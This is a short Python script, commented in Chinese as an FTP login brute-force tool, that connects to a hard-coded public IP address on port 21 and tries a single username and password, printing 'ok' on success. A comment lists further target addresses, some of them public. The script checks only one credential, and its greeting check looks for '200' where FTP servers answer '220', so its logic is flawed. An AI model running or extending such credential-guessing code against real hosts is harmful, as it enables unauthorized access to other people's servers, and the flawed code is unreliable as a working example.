# -*- coding:utf-8 -*-
# @Time :  19:19
# @Author : yangguoping
# @File : .py
# @software :
import ftplib

# FTP 的登录暴力破解
# 124.220.17.5 192.168.1.137  42.193.214.112
ftp=ftplib.FTP()  #创建FTP的对象
username='user'
password='eqhxq'
IP='42.193.214.112'
port=21
reply=ftp.connect(host=IP,port=21,timeout=5)
if '200' in reply:
    try:
        reply=ftp.login(username,password)
        if '230' in reply:
            print('ok')
    except:
        print('down')
else:
    print('连接失败')
ftp.close()

